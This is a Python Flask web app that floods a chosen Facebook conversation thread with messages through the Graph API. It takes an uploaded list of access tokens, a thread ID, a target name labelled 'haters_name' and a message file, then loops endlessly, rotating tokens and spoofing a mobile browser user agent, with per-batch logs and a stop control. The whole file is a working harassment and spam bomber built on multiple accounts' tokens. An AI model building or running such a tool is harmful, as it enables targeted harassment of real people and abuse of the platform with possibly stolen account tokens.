from flask import Flask, request, render_template, jsonify, redirect, url_for
import requests
import time
import os
import threading
import uuid

app = Flask(__name__)

# Global variables
stop_flags = {}
logs = {}


def get_account_name(access_token):
    url = "https://graph.facebook.com/v17.0/me"
    params = {'access_token': access_token}
    try:
        response = requests.get(url, params=params)
        if response.ok:
            data = response.json()
            return data.get('name', 'Unknown')
        else:
            return 'Unknown'
    except Exception:
        return 'Unknown'

def send_messages_from_file(convo_id, tokens, messages, haters_name, speed, batch_id):
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    while not stop_flags.get(batch_id, threading.Event()).is_set():
        try:
            for message_index in range(num_messages):
                if stop_flags.get(batch_id, threading.Event()).is_set():
                    break
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()
                account_name = get_account_name(access_token)
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                log_message = {
                    "convoId": convo_id,
                    "time": time.strftime('%Y-%m-%d %H:%M:%S'),
                    "accountName": account_name,
                    "status": "Success" if response.ok else "Failed",
                    "message": f'{haters_name} {message}'
                }
                logs.setdefault(batch_id, []).append(log_message)

                time.sleep(speed)
        except Exception as e:
            print(f"Error in sending messages: {e}")
            time.sleep(30)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        tokens = request.files['accessToken'].read().decode().splitlines()
        convo_id = request.form['threadId']
        text_file = request.files['txtFile']
        messages = text_file.read().decode().splitlines()
        haters_name = request.form['kidx']
        speed = int(request.form['time'])

        batch_id = str(uuid.uuid4())
        stop_flags[batch_id] = threading.Event()

        threading.Thread(target=send_messages_from_file, args=(convo_id, tokens, messages, haters_name, speed, batch_id)).start()

        return jsonify({
            "status": "started",
            "batch_id": batch_id,
            "links": {
                "messages": url_for('messages_page', batch_id=batch_id)
            }
        })

    return render_template('index.html')

@app.route('/stop/<batch_id>', methods=['POST'])
def stop_sending(batch_id):
    if batch_id in stop_flags:
        stop_flags[batch_id].set()
        return jsonify({"status": "stopped"})
    return jsonify({"status": "batch ID not found"}), 404

@app.route('/messages/<batch_id>', methods=['GET'])
def messages_page(batch_id):
    if batch_id in stop_flags:
        return render_template('messages.html', batch_id=batch_id)
    return "Invalid Batch ID", 404

@app.route('/logs/<batch_id>', methods=['GET'])
def get_logs(batch_id):
    if batch_id in logs:
        return jsonify(logs[batch_id])
    return jsonify({"status": "no logs available for this batch ID"}), 404

@app.route('/stop-status/<batch_id>', methods=['GET'])
def stop_status(batch_id):
    if batch_id in stop_flags:
        return jsonify({"status": "active" if not stop_flags[batch_id].is_set() else "stopped"})
    return jsonify({"status": "batch ID not found"}), 404


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
  
